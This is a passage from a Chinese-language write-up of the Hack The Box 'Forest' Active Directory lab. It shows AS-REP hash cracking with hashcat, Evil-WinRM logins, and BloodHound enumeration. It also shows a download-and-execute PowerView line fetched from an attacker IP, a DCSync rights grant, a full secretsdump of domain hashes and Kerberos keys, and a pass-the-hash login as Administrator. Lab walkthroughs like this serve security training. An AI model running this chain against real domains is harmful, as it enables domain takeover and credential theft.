[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

发现 `svc-alfresco` 的 hash，保存下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ cat svc-alfresco.hash 
$krb5asrep$23$svc-alfresco@HTB.LOCAL:44df6b446b931da83da11e8ae97ce497$82411bf5132724dfac615e77b3a1348e4055fe2621a54c731d2c5ab4d7af297031e2d6993b7520d80465b92709eea3dc6aaa97ab46bf0b3f6fb86aa95ea776d36d7d4286d40e64555613d646aa1c741cb0b295d93e63d7bb4e7feed4151895c10ff63827f48d1d67bdb543cb3f94acf4f85c2032813f45a1ccaddfd59602b8eed4fd48c1e9eea70235eb7c69e318d11e9e4c84cce08775ef2cfd35236552b914f5ada5867ecc653896384ccafdeb265c7ec645835461dc68d147c0477f8fc0fd8c0d781fa181e2897ff0f4747987c5554952f1132308d4fe8b2f016250f623229878664e3d4c
 
```

使用 hashcat 破解出 `svc-alfresco` 的密码为 `s3rvice`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (28107 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:44df6b446b931da83da11e8ae97ce497$82411bf5132724dfac615e77b3a1348e4055fe2621a54c731d2c5ab4d7af297031e2d6993b7520d80465b92709eea3dc6aaa97ab46bf0b3f6fb86aa95ea776d36d7d4286d40e64555613d646aa1c741cb0b295d93e63d7bb4e7feed4151895c10ff63827f48d1d67bdb543cb3f94acf4f85c2032813f45a1ccaddfd59602b8eed4fd48c1e9eea70235eb7c69e318d11e9e4c84cce08775ef2cfd35236552b914f5ada5867ecc653896384ccafdeb265c7ec645835461dc68d147c0477f8fc0fd8c0d781fa181e2897ff0f4747987c5554952f1132308d4fe8b2f016250f623229878664e3d4c:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:44df6b446b931d...4e3d4c
Time.Started.....: Thu Apr 16 03:33:25 2026 (2 secs)
Time.Estimated...: Thu Apr 16 03:33:27 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2689.1 kH/s (1.57ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4079616/14344385 (28.44%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: s9039554h -> s2704081
Hardware.Mon.#01.: Util: 52%

Started: Thu Apr 16 03:33:23 2026
Stopped: Thu Apr 16 03:33:28 2026
```

登陆 `svc-alfresco` 获得 `user flag`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ evil-winrm -i htb.local -u svc-alfresco -p 's3rvice'           
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> gci C:\Users\ -Filter *.txt -File -Recurse
Access to the path 'C:\Users\Administrator' is denied.
At line:1 char:1
+ gci C:\Users\ -Filter *.txt -File -Recurse
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Access to the path 'C:\Users\Public' is denied.
At line:1 char:1
+ gci C:\Users\ -Filter *.txt -File -Recurse
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Public:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Access to the path 'C:\Users\sebastien' is denied.
At line:1 char:1
+ gci C:\Users\ -Filter *.txt -File -Recurse
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\sebastien:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/15/2026  11:49 PM             34 user.txt
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type C:\Users\svc-alfresco\Desktop\user.txt
c009c2fd21fbaef3a317db969ebe4212

```

## Bloodhound 渗透

使用 Bloodhound-python 收集域服务信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ bloodhound-python -c All -u svc-alfresco -p 's3rvice' -ns 10.129.95.210 -d htb.local -dc htb
.local --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: htb.local
INFO: Testing resolved hostname connectivity dead:beef::b049:2512:e99f:ff12
INFO: Trying LDAP connection to dead:beef::b049:2512:e99f:ff12
INFO: Testing resolved hostname connectivity dead:beef::90
INFO: Trying LDAP connection to dead:beef::90
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: htb.local
INFO: Testing resolved hostname connectivity dead:beef::b049:2512:e99f:ff12
INFO: Trying LDAP connection to dead:beef::b049:2512:e99f:ff12
INFO: Testing resolved hostname connectivity dead:beef::90
INFO: Trying LDAP connection to dead:beef::90
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 01M 00S
INFO: Compressing output into 20260416034230_bloodhound.zip
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ ls -liah 20260416034230_bloodhound.zip 
2789871 -rw-rw-r-- 1 kali kali 308K Apr 16 03:43 20260416034230_bloodhound.zipbloobl
```

启动 bloodhound，搜寻得到获得 `HTB.LOCAL` 的路径。

![](Pasted%20image%2020260416162844.png)

枚举 groups 信息，已经拥有 `ACCOUNT OPERATORS` 的权限。

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

在 Kali 中准备好 `PowerView.ps1`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ ls -liah PowerView.ps1 
2789809 -rwxrwxr-x 1 kali kali 753K Apr 16 04:36 PowerView.ps1

```

上传至机器，并加载。

```bash
*Evil-WinRM* PS C:\programdata\apps> IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.58/PowerView.ps1')
```

获得 `Exchange Windows Permissions`。

```bash
*Evil-WinRM* PS C:\programdata\apps> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
*Evil-WinRM* PS C:\programdata\apps> Get-DomainGroupMember -Identity 'Exchange Windows Permissions'


GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : svc-alfresco
MemberDistinguishedName : CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1147

GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : Exchange Trusted Subsystem
MemberDistinguishedName : CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1119

```

重新加载环境。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ evil-winrm -i htb.local -u svc-alfresco -p 's3rvice'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /groups | Select-String "Exchange"

HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group

```

根据 Bloodhound 的提示继续执行。

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync -Verbose
Verbose: [Get-DomainSearcher] search base: LDAP://DC=htb,DC=local
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=svc-alfresco)(name=svc-alfresco)(displayname=svc-alfresco))))
Verbose: [Get-DomainSearcher] search base: LDAP://DC=htb,DC=local
Verbose: [Get-DomainObject] Extracted domain 'htb.local' from 'DC=htb,DC=local'
Verbose: [Get-DomainSearcher] search base: LDAP://DC=htb,DC=local
Verbose: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=DC=htb,DC=local)))
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=htb,DC=local
```

获得 `Administrator` 的 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.95.210 -just-dc                                                                                                                                                                            
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:852ae2917aeac8836af0989b2549888d:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
FOREST$:aes256-cts-hmac-sha1-96:8a12f6ab0c6410db2c1d26d9abcffa8889826549744ce35aabd543a7529cf5b4
FOREST$:aes128-cts-hmac-sha1-96:da0561d169c6ed3c1f4c4d1637c334a7
FOREST$:des-cbc-md5:730b3ebaea1afbb9
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

获得 `root flag`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Forest]
└─$ evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/18/2026  12:14 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
40da5b476**********40acf4fa4ef
```